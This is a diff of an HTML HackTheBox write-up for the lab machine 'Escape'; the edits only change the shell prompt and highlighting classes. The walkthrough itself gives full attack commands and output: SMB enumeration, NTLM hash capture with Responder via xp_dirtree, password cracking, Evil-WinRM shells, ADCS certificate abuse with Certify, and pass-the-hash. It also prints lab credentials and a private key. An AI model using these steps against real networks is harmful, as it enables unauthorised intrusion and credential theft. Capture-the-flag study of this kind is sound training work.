@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Escape</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Medium</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">04</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Escape</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">04</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About escape</h3><br/>
 Escape is a <code>medium</code> difficulty machine on the HackTheBox platform. It is a machine that hosts an Active Directory service. Initially, we acquire credentials through a PDF exposed via an SMB share. These credentials belong to the user GuestUser, which allows us to establish a connection to the MSSQL service.<br/><br/>
@@ -48,7 +48,7 @@ To escalate privileges to the Administrator user, we exploited Active Directory 
 Before starting the exploitation phase, it is crucial to understand what we are dealing with. Remember that a proper enumeration ensures effective exploitation.<br/><br/>
 First and foremost, we need to consider that machines expose their services through ports, so it is essential to identify which ports are available (open) on the target machine.<br/><br/>
 To accomplish this, we will employ the Nmap tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>
 </pre></div>
 
 I will provide a brief explanation of the purpose of each parameter you specified:<br/><br/>
@@ -95,13 +95,13 @@ Scan result:<br/><br/>
 
 As we can see, there is a large number of open ports. For this reason, we used the grepable format. The idea is to format the information by filtering only the ports separated by commas. Then, we will conduct a thorough scan to identify the technologies, services, and versions associated with specific ports.<br/><br/>
 To accomplish this, we will create a regular expression to filter the information from the grepable format file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">portScan</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'Host: '</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span> 
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">portScan</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'Host: '</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span> 
 
 <span class="mi">53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49687</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49708</span><span class="p">,</span><span class="mi">49712</span><span class="p">,</span><span class="mi">60035</span>
 </pre></div>
 
 Once we have represented the ports in the desired format, we will proceed with the scan to identify the technologies, services, and versions running on those ports.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49687</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49708</span><span class="p">,</span><span class="mi">49712</span><span class="p">,</span><span class="mi">60035</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49687</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49708</span><span class="p">,</span><span class="mi">49712</span><span class="p">,</span><span class="mi">60035</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 </pre></div>
 <div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.202</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.34</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -172,7 +172,7 @@ Once we have represented the ports in the desired format, we will proceed with t
 
 After inspecting the scan results, it appears that we are dealing with a domain controller, specifically an Active Directory environment on Windows.<br/><br/>
 At first glance, we can already identify a domain that I will immediately add to the <code>/etc/hosts</code> file.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="c1"># Host addresses</span>
 <span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>  <span class="n">Parrot</span>
@@ -185,7 +185,7 @@ At first glance, we can already identify a domain that I will immediately add to
 </pre></div>
 <h3><br>SMB - TCP 445</br></h3><br>
 The port 445 corresponds to the SMB service. We will start performing reconnaissance on the machine using this service. For this purpose, I will initially use the tool <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span>
 <span class="n">SMB</span>         <span class="mf">10.10.11.202</span>    <span class="mi">445</span>    <span class="n">DC</span>               <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">sequel</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
 </pre></div>
 
@@ -193,7 +193,7 @@ We already obtained the relevant information we were looking for, which was the 
 The SMB service sometimes exposes shared resources on the network. Accessing these resources typically requires the use of valid credentials. However, there are cases where a guest session (Null Session) can be used.<br/><br/>
 A guest or null session is a type of authentication where no password is required for access. Only a username needs to be provided. It's important to note that this doesn't always work, but it's good practice to give it a try nonetheless.<br/><br/>
 I will use the tool <a href="https://github.com/ShawnDEvans/smbmap">smbmap</a> to scan the shared resources using a guest session.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Guest</span> <span class="n">session</span>    <span class="n">IP</span><span class="p">:</span> <span class="mf">10.10.11.202</span><span class="p">:</span><span class="mi">445</span>   <span class="n">Name</span><span class="p">:</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>
 
 <span class="n">Disk</span>         <span class="n">Permissions</span>    <span class="n">Comment</span>
@@ -207,11 +207,11 @@ I will use the tool <a href="https://github.com/ShawnDEvans/smbmap">smbmap</a> t
 </pre></div>
 
 We observe that there is a resource called "public" in which we have read privileges. Let's try listing its contents.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'Public'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'Public'</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/1.png?raw=true"/><br/><br/>
 We have identified a PDF file within the directory. We will proceed to download it and perform an inspection to analyze its content.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'Public'</span> <span class="o">--</span><span class="n">download</span> <span class="s2">"Public/SQL Server Procedures.pdf"</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'test'</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'Public'</span> <span class="o">--</span><span class="n">download</span> <span class="s2">"Public/SQL Server Procedures.pdf"</span>
 
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">download</span><span class="p">:</span> <span class="n">Public</span>\<span class="n">SQL</span> <span class="n">Server</span> <span class="n">Procedures</span><span class="o">.</span><span class="n">pdf</span> <span class="p">(</span><span class="mi">49551</span> <span class="nb">bytes</span><span class="p">)</span>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">File</span> <span class="n">output</span> <span class="n">to</span><span class="p">:</span> <span class="o">./</span><span class="mf">10.10.11.202</span><span class="o">-</span><span class="n">Public_SQL</span> <span class="n">Server</span> <span class="n">Procedures</span><span class="o">.</span><span class="n">pdf</span>
@@ -231,7 +231,7 @@ We can verify if the credentials are correct using the tool <a href="https://git
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/4.png?raw=true"/><br/><br/>
 It appears that the credentials are not valid for the SMB service. However, since the PDF mentioned that they were for accessing the database, I will attempt to use the <code>mssqlclient</code> tool from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> to connect.<br/><br/>
 I will try again with the same credentials:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="s2">"sequel.htb/PublicUser@10.10.11.202"</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="s2">"sequel.htb/PublicUser@10.10.11.202"</span>
 <span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.23</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2021</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>
 
 <span class="n">Password</span><span class="p">:</span> 
@@ -249,7 +249,7 @@ I will try again with the same credentials:<br/><br/>
 At this point, I attempted to use <code>xp_cmdshell</code> to execute commands but was not successful. I came up with the idea of trying to make an SMB request to a server hosted on my machine to obtain the Net-NTLMv2 hash of the MSSQL server's administrator user.<br/><br/>
 It's important to note that even though we are using the <code>PublicUser</code> account, the network-level request will be made by the MSSQL server administrator. Therefore, when executing <code>xp_dirtree</code> on my IP address, the request will be made by a different user than ours.<br/><br/>
 To redirect the request to my server, I will carry out an SMB service poisoning technique with <code>responder</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">responder</span> <span class="o">-</span><span class="n">I</span> <span class="n">tun0</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">responder</span> <span class="o">-</span><span class="n">I</span> <span class="n">tun0</span>
 
                                         <span class="n">__</span>
   <span class="o">.----.-----.-----.-----.-----.-----.--|</span>  <span class="o">|.-----.----.</span>
@@ -306,7 +306,7 @@ To redirect the request to my server, I will carry out an SMB service poisoning 
     <span class="n">Don</span><span class="s1">'t Respond To Names     ['</span><span class="n">ISATAP</span><span class="s1">']</span>
 
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Current</span> <span class="n">Session</span> <span class="n">Variables</span><span class="p">:</span>
-    <span class="n">Responder</span> <span class="n">Machine</span> <span class="n">Name</span>     <span class="p">[</span><span class="n">WIN</span><span class="o">-</span><span class="n">AFNXB8Z9RCY</span><span class="p">]</span>
+    <span class="n">Responder</span> <span class="k">Machine</span> <span class="n">Name</span>     <span class="p">[</span><span class="n">WIN</span><span class="o">-</span><span class="n">AFNXB8Z9RCY</span><span class="p">]</span>
     <span class="n">Responder</span> <span class="n">Domain</span> <span class="n">Name</span>      <span class="p">[</span><span class="n">GMQ6</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">]</span>
     <span class="n">Responder</span> <span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span> <span class="n">Port</span>     <span class="p">[</span><span class="mi">46170</span><span class="p">]</span>
 
@@ -324,7 +324,7 @@ We will wait a few seconds, and if everything goes well, the response server sho
 </pre></div>
 
 We have successfully obtained the Net-NTLMv2 hash of the user <code>sql_svc</code>. Now, the idea is to store it in a file and perform a brute-force attack to try to obtain the plaintext password.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">file</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">file</span>
 <span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
 <span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">netntlmv2</span><span class="p">,</span> <span class="n">NTLMv2</span> <span class="n">C</span><span class="o">/</span><span class="n">R</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="mi">32</span><span class="o">/</span><span class="mi">64</span><span class="p">])</span>
 <span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
@@ -341,15 +341,15 @@ Perfect, we have obtained the password in a readable format, and now we can atte
 </pre></div>
 
 Once again, we will use the tool <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/5.png?raw=true"/><br/><br/>
 We can verify if the user <code>sql_svc</code> belongs to the "Remote Management Users" group, so that we can connect to the Windows Remote Management service using tools like <code>Evil-WinRM</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/6.png?raw=true"/><br/><br/>
 Since the credentials are valid and the user <code>sql_svc</code> belongs to the "Remote Management Users" group, we can attempt to connect to the WinRM service using the tool <code>Evil-WinRM</code>. This will allow us to obtain an interactive console as the user <code>sql_svc</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'sql_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'REGGIE1234ronnie'</span>
 
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sql_svc</span>\<span class="n">Documents</span><span class="o">&gt;</span>
 </pre></div>
@@ -392,18 +392,18 @@ By listing the contents of the folder, we can see that there is a subfolder name
 Upon examining the content of the "ERRORLOG.BAK" file, we can see that it stores error logs that have occurred on the SQL server. Furthermore, we can notice that someone has attempted to authenticate with the username "Ryan.Cooper."<br/><br/>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/7.png?raw=true"/><br/><br/>
 Also, a few lines below, we can see that there have been authentication attempts with the username "NuclearMosquito3." The username is somewhat suspicious. I decided to try authenticating to the SMB service using the username "Ryan.Cooper" and used "NuclearMosquito3" as the password.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/8.png?raw=true"/><br/><br/>
 The credentials are correct, and the user "Ryan.Cooper" also has access to the WinRM service. Therefore, using the Evil-WinRM tool again, we can attempt to connect.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span>
 
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Ryan</span><span class="o">.</span><span class="n">Cooper</span>\<span class="n">Documents</span><span class="o">&gt;</span>
 </pre></div>
 <h3><br>Shell as Administrator</br></h3><br>
 We have identified the ADCS (Active Directory Certificate Services) service. It is always important to investigate Active Directory Certificate Services in a domain. We can try to do so using the tool <code>crackmapexec</code>.<br/><br/>
 It is worth noting that I had some issues with OpenSSL to run this reconnaissance mode, so I had to install a customized version of crackmapexec along with a Python virtual environment.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span> <span class="o">-</span><span class="n">M</span> <span class="n">adcs</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Ryan.Cooper'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'NuclearMosquito3'</span> <span class="o">-</span><span class="n">M</span> <span class="n">adcs</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/10.png?raw=true"/><br/><br/>
 Once we know that ADCS is operational, we need to identify if there are any insecure configurations in any of the templates. To do this, we will make use of <code>Certify.exe</code>. I obtained this executable file from the SharpCollection repository on GitHub.<br/><br/>
@@ -432,7 +432,7 @@ With this information, we can execute the following command using <code>Certify.
 
 In this command, we are essentially requesting a certificate based on the username we want to impersonate.<br/><br/>
 We save the keys returned by the command according to their type. That is, the private key is saved in a .key file, while the public key, which is actually a certificate, is saved in a .pem file.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">private</span><span class="o">.</span><span class="n">key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">private</span><span class="o">.</span><span class="n">key</span>
 <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
 <span class="n">MIIEpAIBAAKCAQEA4p7W</span><span class="o">/</span><span class="n">UJGTpymQtvqptr7MCrinEfitT2MRnvcKdOzE7BWAV84</span>
 <span class="n">WwxdkWuYQCEe5lbgnyxlCNDd5DjIvS57KANnpjQHWSjxN2ORQGqegerXCCx66L8J</span>
@@ -461,7 +461,7 @@ We save the keys returned by the command according to their type. That is, the p
 <span class="o">//</span><span class="mi">06</span><span class="n">DTGg</span><span class="o">/</span><span class="n">NjyYWstCCe5DLst1nGQYyYfAU3uSQvAibj3BemZhu211w</span><span class="o">==</span>
 <span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
 <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
 <span class="n">MIIGEjCCBPqgAwIBAgITHgAAAApmSQbdZ0g</span><span class="o">+</span><span class="n">nQAAAAAACjANBgkqhkiG9w0BAQsF</span>
 <span class="n">ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs</span>
@@ -525,11 +525,11 @@ Finally, we obtain the NTLM hash of the Administrator user:<br/><br/>
 </pre></div>
 
 This type of hash can be used to perform a Pass-the-Hash attack, which means we can use the hash to authenticate without entering a password. Let's verify if it works with crackmapexec:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.202</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/12.png?raw=true"/><br/><br/>
 Since the user is Administrator, we can access the system using Evil-WinRM by directly passing the hash, which will allow us to access the system as this user.<br/><br/>
